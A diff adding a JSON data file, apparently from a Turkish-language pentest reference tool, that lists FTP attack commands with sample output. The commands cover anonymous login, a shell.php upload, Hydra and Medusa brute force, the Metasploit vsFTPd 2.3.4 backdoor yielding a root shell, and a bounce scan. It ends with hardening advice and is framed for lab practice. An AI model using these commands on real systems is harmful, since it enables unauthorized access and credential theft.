@@ -1,0 +1,96 @@
+{
+  "port": 21,
+  "service": "FTP",
+  "protocol": "TCP",
+  "description": "File Transfer Protocol — cleartext dosya transfer protokolü. Kimlik bilgileri şifresiz iletilir, anonymous login sıkça yanlış yapılandırılır.",
+  "risk": "high",
+  "sections": [
+    {
+      "id": "enum",
+      "title": "FTP Enumeration (Nmap)",
+      "commands": [
+        {
+          "label": "FTP Versiyon + Script Taraması",
+          "command": "nmap -sV -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor 192.168.1.105",
+          "description": "FTP servisi tanımla, anonymous login ve backdoor kontrol et",
+          "output": "21/tcp open ftp vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed\n| ftp-syst: UNIX Type: L8"
+        },
+        {
+          "label": "Anonymous Login Kontrolü",
+          "command": "nmap -p 21 --script ftp-anon 192.168.1.105",
+          "description": "Anonymous FTP erişimi var mı hızlıca kontrol et",
+          "output": "| ftp-anon: Anonymous FTP login allowed (220 vsftpd)",
+          "tip": "Anonymous login bulunursa FTP ile bağlan: ftp 192.168.1.105 → kullanıcı: anonymous"
+        }
+      ]
+    },
+    {
+      "id": "access",
+      "title": "FTP Bağlantı ve Dosya Transfer",
+      "commands": [
+        {
+          "label": "Anonymous FTP Girişi",
+          "command": "ftp 192.168.1.105",
+          "description": "Senaryo: FTP'ye bağlan, kullanıcı: anonymous, şifre: herhangi@email.com",
+          "output": "Connected to 192.168.1.105.\n220 (vsFTPd 3.0.3)\nName: anonymous\nPassword:\n230 Login successful.\nftp>"
+        },
+        {
+          "label": "FTP Komutları",
+          "command": "ls -la && get flag.txt && put shell.php && mget *.txt",
+          "description": "Temel FTP komutları: listele, indir, yükle",
+          "tip": "binary komutuyla binary mode'a geç — EXE/PDF gibi dosyaları bozmadan indir"
+        },
+        {
+          "label": "wget ile Toplu FTP İndirme",
+          "command": "wget -r ftp://anonymous:@192.168.1.105/",
+          "description": "Senaryo: FTP üzerindeki tüm dosyaları recursive olarak indir",
+          "tip": "Büyük dizinlerde kullanışlı — tek komutla tüm içerik iner"
+        },
+        {
+          "label": "NetCat ile FTP'siz Bağlantı",
+          "command": "nc 192.168.1.105 21",
+          "description": "Ham FTP protokolüyle banner grabbing",
+          "output": "220 (vsFTPd 3.0.3)"
+        }
+      ]
+    },
+    {
+      "id": "bruteforce",
+      "title": "FTP Brute Force",
+      "commands": [
+        {
+          "label": "Hydra FTP Brute Force",
+          "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.105",
+          "description": "Senaryo: Bilinen kullanıcı için FTP parola brute force",
+          "output": "[21][ftp] host: 192.168.1.105 login: admin password: ftp123",
+          "warning": "Brute force loglanır ve IPS tarafından IP bloklanabilir."
+        },
+        {
+          "label": "Medusa FTP Brute Force",
+          "command": "medusa -h 192.168.1.105 -u admin -P /usr/share/wordlists/rockyou.txt -M ftp",
+          "description": "Medusa ile FTP brute force"
+        }
+      ]
+    },
+    {
+      "id": "exploit",
+      "title": "FTP Backdoor ve Exploitler",
+      "commands": [
+        {
+          "label": "vsFTPd 2.3.4 Backdoor (Metasploit)",
+          "command": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.1.105; run\"",
+          "description": "Senaryo: vsFTPd 2.3.4 sürümünde backdoor — root shell ver",
+          "output": "[+] Command shell session 1 opened\nsh-4.1# whoami\nroot",
+          "tip": "Metasploitable2'nin bu vsFTPd versiyonu içerdiği bilinir — HackTheBox ve THM'de sık karşılaşılır."
+        },
+        {
+          "label": "FTP Bounce Scan (Nmap)",
+          "command": "nmap -b anonymous:@192.168.1.105 192.168.2.0/24",
+          "description": "FTP proxy aracılığıyla iç ağ taraması (FTP Bounce Attack)",
+          "warning": "Çoğu modern FTP sunucusunda devre dışı."
+        }
+      ]
+    }
+  ],
+  "defenseNote": "FTP güvenlik önlemleri: FTP yerine SFTP (SSH üzerinden) veya FTPS (FTP+TLS) kullanın. Anonymous login'i devre dışı bırakın (vsftpd: anonymous_enable=NO). FTP trafiğini şifreleyin. Kullanıcıları chroot jail içine kilityin (chroot_local_user=YES). Pasif mode için port aralığı sınırlayın. fail2ban ile brute force engelleyin. İzin verilmeyen kullanıcılar için userlist_enable=YES."
+}
